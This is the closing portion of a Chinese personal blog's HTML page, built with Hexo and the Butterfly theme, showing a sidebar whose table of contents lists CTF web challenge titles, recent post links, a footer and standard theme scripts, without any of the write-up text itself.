src="https://img1.baidu.com/it/u=3722771254,1462812708&fm=253&fmt=auto&app=138&f=JPEG?w=370&h=500" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-04</div><div class="title">你爹刷题4</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/11/02/QcqvSFhZDRg5b7o.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">吴豪滨</div><div class="author-info__description">我是你爹</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">23</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">快滚去学</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83"><span class="toc-number">1.</span> <span class="toc-text">[GXYCTF2019]禁止套娃</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GWCTF-2019-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">2.</span> <span class="toc-text">[GWCTF 2019]我有一个数据库</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BJDCTF2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4"><span class="toc-number">3.</span> <span class="toc-text">[BJDCTF2020]ZJCTF，不过如此</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb"><span class="toc-number">4.</span> <span class="toc-text">[网鼎杯 2020 朱雀组]phpweb</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2"><span class="toc-number">5.</span> <span class="toc-text">[强网杯 2019]高明的黑客</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BJDCTF2020-Mark-loves-cat"><span class="toc-number">6.</span> <span class="toc-text">[BJDCTF2020]Mark loves cat</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/11/15/hello-world/" title="Hello World"><img src="https://i.loli.net/2021/11/09/gRnKyC1ztL7PIDH.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Hello World"/></a><div class="content"><a class="title" href="/2022/11/15/hello-world/" title="Hello World">Hello World</a><time datetime="2022-11-15T06:59:06.203Z" title="发表于 2022-11-15 14:59:06">2022-11-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/06/10/%E6%9C%80%E7%BB%88%E6%B1%87%E6%8A%A5/" title="最终汇报"><img src="https://s2.loli.net/2022/03/23/ouOyf5ecU1hawIS.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="最终汇报"/></a><div class="content"><a class="title" href="/2022/06/10/%E6%9C%80%E7%BB%88%E6%B1%87%E6%8A%A5/" title="最终汇报">最终汇报</a><time datetime="2022-06-10T06:15:21.000Z" title="发表于 2022-06-10 14:15:21">2022-06-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/03/23/DASCTF%202022/" title="DASCTF 2022"><img src="https://s2.loli.net/2022/03/23/ouOyf5ecU1hawIS.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DASCTF 2022"/></a><div class="content"><a class="title" href="/2022/03/23/DASCTF%202022/" title="DASCTF 2022">DASCTF 2022</a><time datetime="2022-03-23T06:15:21.000Z" title="发表于 2022-03-23 14:15:21">2022-03-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/03/23/%E4%BD%A0%E7%88%B9%E5%88%B7%E9%A2%986/" title="你爹刷题6"><img src="https://s2.loli.net/2022/03/23/ouOyf5ecU1hawIS.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="你爹刷题6"/></a><div class="content"><a class="title" href="/2022/03/23/%E4%BD%A0%E7%88%B9%E5%88%B7%E9%A2%986/" title="你爹刷题6">你爹刷题6</a><time datetime="2022-03-23T06:15:21.000Z" title="发表于 2022-03-23 14:15:21">2022-03-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/03/18/%E4%BD%A0%E7%88%B9%E5%88%B7%E9%A2%985/" title="你爹刷题5"><img src="https://s2.loli.net/2022/03/18/HlX1uC4D9eRkYPh.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="你爹刷题5"/></a><div class="content"><a class="title" href="/2022/03/18/%E4%BD%A0%E7%88%B9%E5%88%B7%E9%A2%985/" title="你爹刷题5">你爹刷题5</a><time datetime="2022-03-18T06:15:21.000Z" title="发表于 2022-03-18 14:15:21">2022-03-18</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://s2.loli.net/2022/02/08/ia9UBKSlbjgFZEs.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By 吴豪滨</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font-plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font-minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
